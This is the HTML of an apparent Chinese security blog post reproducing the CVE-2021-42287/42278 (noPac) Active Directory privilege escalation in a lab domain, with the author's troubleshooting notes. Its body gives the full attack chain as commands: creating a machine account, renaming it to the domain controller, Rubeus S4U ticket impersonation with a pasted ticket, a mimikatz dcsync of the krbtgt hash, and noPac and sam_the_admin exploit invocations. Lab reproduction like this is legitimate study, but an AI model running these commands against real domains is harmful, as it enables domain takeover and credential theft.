@@ -1,0 +1,811 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="CVE-2021-42287&#x2F;CVE-2021-42278复现">
+<meta property="og:url" content="http://mamor5409.github.io/posts/1fd95242/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/1.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/2.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/3.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/4.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/5.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/6.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/7.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/8.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/9.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/10.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/11.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/12.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/13.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/14.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/15.png">
+<meta property="og:image" content="http://mamor5409.github.io/posts/1fd95242/16.png">
+<meta property="article:published_time" content="2021-12-20T12:32:52.000Z">
+<meta property="article:modified_time" content="2022-01-12T08:32:34.428Z">
+<meta property="article:author" content="Mamor">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://mamor5409.github.io/posts/1fd95242/1.png">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/1fd95242/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>CVE-2021-42287/CVE-2021-42278复现 | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/1fd95242/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CVE-2021-42287/CVE-2021-42278复现
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-12-20 20:32:52" itemprop="dateCreated datePublished" datetime="2021-12-20T20:32:52+08:00">2021-12-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-01-12 16:32:34" itemprop="dateModified" datetime="2022-01-12T16:32:34+08:00">2022-01-12</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8F%90%E6%9D%83/" itemprop="url" rel="index"><span itemprop="name">提权</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CVE-2021-42278，机器账户的名字一般来说应该以$结尾，但AD没有对域内机器账户名做验证。</p>
+<p>CVE-2021-42287，与上述漏洞配合使用，创建与DC机器账户名字相同的机器账户（不以$结尾），账户请求一个TGT后，更名账户，然后通过S4U2self申请TGS Ticket，接着DC在TGS_REP阶段，这个账户不存在的时候，DC会使用自己的密钥加密TGS Ticket，提供一个属于该账户的PAC，然后我们就得到了一个高权限ST。</p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ">https://mp.weixin.qq.com/s/Z3mI5eEc8-iudqdU7EZ3EQ</a> </p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mrhonest/p/15682858.html">https://www.cnblogs.com/mrhonest/p/15682858.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
+<h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>域内普通用户</p>
+<p><code>lab\user01 </code>  / <code>Test.123</code></p>
+<p>Win2008</p>
+<p>Win2012</p>
+<h3 id="复现踩坑"><a href="#复现踩坑" class="headerlink" title="复现踩坑"></a><em>复现</em>踩坑</h3><h4 id="创建域用户hello"><a href="#创建域用户hello" class="headerlink" title="创建域用户hello"></a>创建域用户hello</h4><p>这里使用一个域内普通用户进行登录  下载Powermad.ps1</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount hello -Domain lab.com -DomainController DC01.lab.com -Verbose</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1fd95242/1.png" alt="截图"></p>
+<p><img src="/posts/1fd95242/2.png" alt="截图"></p>
+<p>成功创建用户test</p>
+<h4 id="删除spn记录"><a href="#删除spn记录" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powerview.ps1</span><br><span class="line">Set-DomainObject &quot;CN&#x3D;hello,CN&#x3D;Computers,DC&#x3D;lab,DC&#x3D;com&quot;  -Clear &#39;serviceprincipalname&#39; -Verbose</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>先用<code>setspn</code>查一下 </p>
+<p><code>setspn -Q */* | findstr hola</code></p>
+<p><img src="/posts/1fd95242/3.png" alt="截图"></p>
+<br>
+
+<p>这里 我另起了一个powershell去引用桌面上的cmd 结果会报错 ，然后把powerview放在Powermad同目录下导入就不报错了…. （不知道为啥…）</p>
+<p><img src="/posts/1fd95242/4.png" alt="截图"></p>
+<p>移动后就正常了</p>
+<p><img src="/posts/1fd95242/5.png" alt="截图"></p>
+<p>(<del>在win2012powershell下 Set-DomainObject没有这个东西？？？！！！)…</del></p>
+<p>发现两个powerview.ps1 大小不一样 不是同一个 服了…… 一个700+K 一个300+K</p>
+<p>然后去尝试删除spn 。。。</p>
+<p><img src="/posts/1fd95242/6.png" alt="截图"></p>
+<br>
+
+<h4 id="重设机器名"><a href="#重设机器名" class="headerlink" title="重设机器名"></a>重设机器名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-MachineAccountAttribute -MachineAccount hello -Value &quot;DC01&quot; -Attribute samaccountname -Verbose</span><br></pre></td></tr></table></figure>
+
+<p>改为域控名</p>
+<p><img src="/posts/1fd95242/7.png" alt="截图"></p>
+<h4 id="请求TGT"><a href="#请求TGT" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><del>win2008下使用Rubeus.exe报错…….$#%@&amp;@!#@!…….</del></p>
+<p><del>去github上下载下来编译一下 然后在win2008上运行 说缺少.net4.0 然后去下载下来安装，结果安装超时了，这台机器的网络…</del></p>
+<p>后面找了个 .net4.5免安装版就可用去使用Rebues。。。。</p>
+<br>
+
+<h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><h4 id="创建机器用户hello"><a href="#创建机器用户hello" class="headerlink" title="创建机器用户hello"></a>创建机器用户hello</h4><h4 id="删除spn记录-1"><a href="#删除spn记录-1" class="headerlink" title="删除spn记录"></a>删除spn记录</h4><p><img src="/posts/1fd95242/8.png" alt="截图"></p>
+<h4 id><a href="#" class="headerlink" title></a></h4><h4 id="重新设置机器名"><a href="#重新设置机器名" class="headerlink" title="重新设置机器名"></a>重新设置机器名</h4><p><img src="/posts/1fd95242/9.png" alt="截图"></p>
+<br>
+
+<h4 id="请求TGT-1"><a href="#请求TGT-1" class="headerlink" title="请求TGT"></a>请求TGT</h4><p><img src="/posts/1fd95242/10.png" alt="截图"></p>
+<br>
+
+<h4 id="恢复原来的机器属性"><a href="#恢复原来的机器属性" class="headerlink" title="恢复原来的机器属性"></a>恢复原来的机器属性</h4><p><img src="/posts/1fd95242/11.png" alt="截图"></p>
+<br>
+
+<h4 id="获取票据"><a href="#获取票据" class="headerlink" title="获取票据"></a>获取票据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u &#x2F;impersonateuser:Administrator &#x2F;nowrap &#x2F;dc:DC01.lab.com &#x2F;self &#x2F;altservice:LDAP&#x2F;DC01.lab.com  &#x2F;ptt &#x2F;ticket:doIElDCCBJCgAwIBBaEDAgEWooIDvDCCA7hhggO0MIIDsKADAgEFoQkbB0xBQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2xhYi5jb22jggN+MIIDeqADAgESoQMCAQKiggNsBIIDaIW9iHW2Vv1XWw71Yc6V1rdL7m2Mwmzw+rj6X1OQqR1lNapte8JpgGMN&#x2F;EW+0FWCqpkFBYYR0q+ljSY56LIpTNSYK2V4ZEPmBTv&#x2F;iZtG3rvGdHafJxyD3b&#x2F;GfWSVLt3c1Ev7LGf9mUP&#x2F;tDzsxQ46mDgdbUiuB5B7&#x2F;z9vaj7h71J8M2bkIUfeP4xgNcxR5PvLbQsyp6KE54WXRxpreU4ibz8vsplH3i8sKzrPFRM1w7m2XFBonMc1A3oElU16aHwIsDUew60eRa&#x2F;wqAkIl9cmO7d&#x2F;hSux+7aM7ta7Q3+JfnyOYjl0BQMbzK+gDdqtdcgkycjG&#x2F;W&#x2F;+EPbqUHin8wKrY3O8SHix2K1Dq0VIp+GegeiiSlLvk7q+1CixSbo2DxSFAkKDyTUx8YfqSTLzy6scD4Hyi8GSVZCNf2vCTL8KFpSHyPtMURaZitv5YOmBVlK0gq73cKTst6cGzCN0h9XLVOm+RGbjLShOWpsJ4P+9pKLS12PN9EgughEHbCen0Hv2dXLfe+dwDL6Gd5A+TYbsNIyfHrxLhcdu6H1bW6cKSZaXfASM&#x2F;1RyXUA15O0b0y5uh8PpQd82ptvckHkSa2gHqamM08UsUs60H5OPzGRSvtNskOHgFkDYcX6MgKJNFOq+g+J&#x2F;EKchSS0yIc</span><br><span class="line">0iJPCoFLaTCSvlMmq3G5&#x2F;4epI0gjwx6a6oeUTutxc8MfnHL2kAYxW7tgezuDxKVno4LZFVJWKbObrXctu2i16Dr7m5eLgyuKf5UQ41RiOUoTSLQUt4s2gq73&#x2F;NG1MzwRmPq5Z+cWmXDzVual58Mm5W4fipIYqPg88Wnm+&#x2F;WmxYi0ICQgxhJENaZQf3UM0fXKSjTzgVWHkFRfaGx4uaAqzn8MKs4FtCmSf+OVEf7QW0imtvDAsQNixLU8ZTF+OK6rZDs76GB43KUxlhPUTl7NE9kpzlwcef8HiRc4rSsc386&#x2F;NeqsSDjZXgqYcAAQX7v0tNJ0lt+sRrg6GQT7YYHegOMQ9ywBgvdMVAFAzEPMnmW7GhHCOhubxHtDzAEDgkmpM0LXdE27m0acD6XyrRTPdf8slsKD1GliX5iW77L9+qqThwBmb9xRMFgNRFGJDE62g0SlY3+QY1IRpdAUqCuBHKctmeyWemDVBlJWbmqooHwBU3HwOxe8J+TPUevVBko4HDMIHAoAMCAQCigbgEgbV9gbIwga+ggawwgakwgaagGzAZoAMCARehEgQQHKpy33rwHG1c49Aha5Vzp6EJGwdMQUIuQ09NohEwD6ADAgEBoQgwBhsEREMwMaMHAwUAQOEAAKURGA8yMDIxMTIyMTA3MTEwN1qmERgPMjAyMTEyMjExNzExMDdapxEYDzIwMjExMjI4MDcxMTA3WqgJGwdMQUIuQ09NqRwwGqADAgECoRMwERsGa3JidGd0GwdsYWIuY29t</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><del>这里不管使用cmd 还是powershell  命令太长了被分成了两个……？？？</del></p>
+<p>额 居然是在复制时候 太长notepad给自己换行了</p>
+<p><img src="/posts/1fd95242/12.png" alt="截图"></p>
+<br>
+
+<h4 id="获取krbtgt用户的NTLM-Hash"><a href="#获取krbtgt用户的NTLM-Hash" class="headerlink" title="获取krbtgt用户的NTLM Hash"></a>获取krbtgt用户的NTLM Hash</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:lab\krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/posts/1fd95242/13.png" alt="截图"></p>
+<br>
+
+<h4 id="清除票据"><a href="#清除票据" class="headerlink" title="清除票据"></a>清除票据</h4><p><code>klist purge</code></p>
+<br>
+
+<h3 id="noPac"><a href="#noPac" class="headerlink" title="noPac"></a>noPac</h3><p><a target="_blank" rel="noopener" href="https://github.com/cube0x0/noPac">https://github.com/cube0x0/noPac</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
+<p>在win2008下 提示需要 .Net4.0 结果安装失败了..</p>
+<p>然后换win2012R2 的一台域机器去复现</p>
+<p>0x01 扫描探测</p>
+<p><code>noPac.exe -scan  -domain lab.com -user user01 -pass Test.123</code>  （这里密码加’’会报错）</p>
+<p><img src="/posts/1fd95242/14.png" alt="截图"></p>
+<p>复现失败，可用创建用户，但是再</p>
+<p>然后尝试再这个普通域用户下去安装python 但是报错策略XX 失败  python安装也超时了 **@#￥@**@$@#</p>
+<p> 去尝试安装。net4.5  还是超时了 这个域环境是别人给我的  真***烂，PTT,PTK,PTH都实验不了 机器网也问题很大 能访问bing 别的访问不了….</p>
+<h4 id="踩完的后的利用。。。"><a href="#踩完的后的利用。。。" class="headerlink" title="踩完的后的利用。。。"></a>踩完的后的利用。。。</h4><h5 id="扫描探测"><a href="#扫描探测" class="headerlink" title="扫描探测"></a>扫描探测</h5><p><code>noPac.exe scan -domain lab.com -user user01 -pass Test.123</code>  这里密码处网上加的’’但是这里我加上就会报错 不加的话可正常使用</p>
+<p><img src="/posts/1fd95242/15.png" alt="截图"></p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p><code>./noPac.exe -domain attack.local -user oa -pass &#39;!@#Qz123&#39; /dc dc.attack.local /mAccount test123 /mPassword passW0rd /service cifs /ptt</code></p>
+<p><code>ls  \\DC01.lab.com\C$ </code></p>
+<p><img src="/posts/1fd95242/16.png" alt="截图"></p>
+<br>
+
+<p>还有个python版的noPac 但是这台机器上的python是离线安装的 pip还不知道怎么安 ┭┮﹏┭┮ 踩坑踩了一天终于能复现到了</p>
+<br>
+
+<h4 id="noPac（python）"><a href="#noPac（python）" class="headerlink" title="noPac（python）"></a>noPac（python）</h4><p> <a target="_blank" rel="noopener" href="https://github.com/waterrr/noPac?ref=pythonawesome.com">https://github.com/waterrr/noPac?ref=pythonawesome.com</a></p>
+<br>
+
+<h4 id="Sam-the-admin"><a href="#Sam-the-admin" class="headerlink" title="Sam_the_admin"></a>Sam_the_admin</h4><p>CVE-2021-42287/CVE-2021-42278 Attack</p>
+<p>Python 利用脚本：<a target="_blank" rel="noopener" href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p>
+<p><code>python3 sam_the_admin.py &quot;redteam/saul:Red12345&quot; -dc-ip 10.10.10.8 -shell</code></p>
+<p>这个还没尝试 <a target="_blank" rel="noopener" href="https://heibai.org.cn/2071.html">https://heibai.org.cn/2071.html</a></p>
+<br>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>这个洞复现踩了好多坑….用了一天的时间….</p>
+<p>由于测试机器使用的域内普通用户，在下载、安装上都会受到限制，然后选择采取使用离线安装的方式去下载相关版本，只下载了免安装的.net 4.6和 py3.7 但是py3的pip还没整上去，后续的exp脚本就没有测试。</p>
+<p>还有就是因为是在虚拟机上运行的，且是使用的域内普通用户，因此这个vmtools 无法直接从外面复制进来文件，而且在尝试直接使用python http服务去下载是 默认浏览器存在安全策略，而普通用户无法关闭，然后我去用administrator去关闭了IE安全策略后，还是存在安全策略，然后没法使用。只能通过在测试机器上去访问administrator目录下 从外面拖进来的所需要的文件</p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+<div>
+
+  <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">------------- 💖 🌞 本 文 结 束 😚 感 谢 您 的 阅 读 🌞 💖 -------------</div>
+    
+</div>
+
+</div>
+
+<div>
+      
+        
+      
+</div>
+
+      <footer class="post-footer">
+          
+          <div class="post-tags">
+              <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag"></i><i class="fa fa-tag"></i> 内网渗透</a>
+              <a href="/tags/%E6%8F%90%E6%9D%83/" rel="tag"></i><i class="fa fa-tag"></i> 提权</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/5bd4bc7e/" rel="prev" title="log4j_rce利用">
+      <i class="fa fa-chevron-left"></i> log4j_rce利用
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/b6714d8e/" rel="next" title="记一次XXS绕过学习">
+      记一次XXS绕过学习 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">2.</span> <span class="nav-text">参考</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">3.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0%E8%B8%A9%E5%9D%91"><span class="nav-number">4.</span> <span class="nav-text">复现踩坑</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E5%9F%9F%E7%94%A8%E6%88%B7hello"><span class="nav-number">4.1.</span> <span class="nav-text">创建域用户hello</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4spn%E8%AE%B0%E5%BD%95"><span class="nav-number">4.2.</span> <span class="nav-text">删除spn记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E8%AE%BE%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="nav-number">4.3.</span> <span class="nav-text">重设机器名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82TGT"><span class="nav-number">4.4.</span> <span class="nav-text">请求TGT</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%8D%E7%8E%B0"><span class="nav-number">5.</span> <span class="nav-text">复现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%9B%E5%BB%BA%E6%9C%BA%E5%99%A8%E7%94%A8%E6%88%B7hello"><span class="nav-number">5.1.</span> <span class="nav-text">创建机器用户hello</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A0%E9%99%A4spn%E8%AE%B0%E5%BD%95-1"><span class="nav-number">5.2.</span> <span class="nav-text">删除spn记录</span></a></li><li class="nav-item nav-level-4"><a class="nav-link"><span class="nav-number">5.3.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%87%8D%E6%96%B0%E8%AE%BE%E7%BD%AE%E6%9C%BA%E5%99%A8%E5%90%8D"><span class="nav-number">5.4.</span> <span class="nav-text">重新设置机器名</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82TGT-1"><span class="nav-number">5.5.</span> <span class="nav-text">请求TGT</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D%E5%8E%9F%E6%9D%A5%E7%9A%84%E6%9C%BA%E5%99%A8%E5%B1%9E%E6%80%A7"><span class="nav-number">5.6.</span> <span class="nav-text">恢复原来的机器属性</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%A5%A8%E6%8D%AE"><span 